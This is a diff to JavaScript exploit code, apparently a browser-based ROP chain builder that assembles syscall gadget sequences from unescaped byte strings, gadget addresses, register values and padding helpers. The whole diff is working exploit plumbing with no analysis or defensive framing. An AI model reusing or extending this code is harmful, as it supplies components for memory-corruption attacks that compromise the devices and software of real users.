@@ -16,7 +16,17 @@
 
 function syscallGadgetSetStartBytes()
 {
-	return unescape("\u4141\u7EBE")+hexw2bin(g_2)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141")+hexw2bin(pad4)+hexw2bin(g_toc)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141")+hexw2bin(pad4)+hexw2bin(r30_temp)+hexw2bin(pad4)+hexw2bin(r31_temp)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
+	//return unescape("\u4141\u7EBE")
+	return unescape("\u7EBE\u0000")
+	+hexw2bin(g_2)
+	+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141")
+	+hexw2bin(pad4)+hexw2bin(g_toc)
+	+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141")
+	+hexw2bin(pad4)
+	+hexw2bin(r30_temp)
+	+hexw2bin(pad4)
+	+hexw2bin(r31_temp)
+	+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
 }
 
  // r3 gets set by r29 before calling next
@@ -27,25 +37,53 @@ function syscallGadgetSet1(a1_r3,a1_r4,a1_r5,a1_r6,a1_r7,a1_r8,a1_r9,a1_r10,a1_r
 
 function syscallGadgetSetEndBytes()
 {
-	return unescape("\u4141\uBE7E");
+	return unescape("\u0000\uBE7E");
 }
 
 function addbytes(size)
 {
 	switch(size)
 	{
-		case "2":
+		case 2:
 		return unescape("\4141");
 		break;
-		case "4":
+		case 4:
 		return unescape("\4141\u4242");
 		break;
-		case "8":
+		case 8:
 		return unescape("\4141\u4242\u4343\u4444");
 		break;
-		case "16":
+		case 16:
 		return unescape("\4141\u4242\u4343\u4444\4545\u4646\u4747\u4848");
 		break;
 	}
 }
 
+function checkNbytes(nbytes)
+{
+	if(nbytes%2!==0){throw "fill_by_Xbytes functions cannot use nbytes = 0x"+nbytes.toString(16)+". nbytes must be set to an even value.";}
+}
+
+function fillBytes(chunksize,nbytes,hex_val)
+{
+	//if(chunksize===2){}
+	if(chunksize===4){hex_val=2}
+	if(chunksize===6){hex_val=3}
+	if(chunksize===8){hex_val=4}
+	if(chunksize===10){hex_val=5}
+	if(chunksize===12){hex_val=6}
+	if(chunksize===14){hex_val=7}
+	if(chunksize===16){hex_val=8}
+	if(chunksize===18){hex_val=9}
+	if(chunksize===20){hex_val=10}
+	if(chunksize===22){hex_val=11}
+	if(chunksize===24){hex_val=12}
+	if(chunksize===26){hex_val=13}
+	if(chunksize===28){hex_val=14}
+	if(chunksize===30){hex_val=15}
+	if(chunksize===32){hex_val=16}
+	checkNbytes(nbytes);
+	var stemp='';var iterator=0;
+	while(iterator<nbytes/chunksize){stemp+=hexh2bin(hex_val);iterator++;}
+	return stemp;
+}
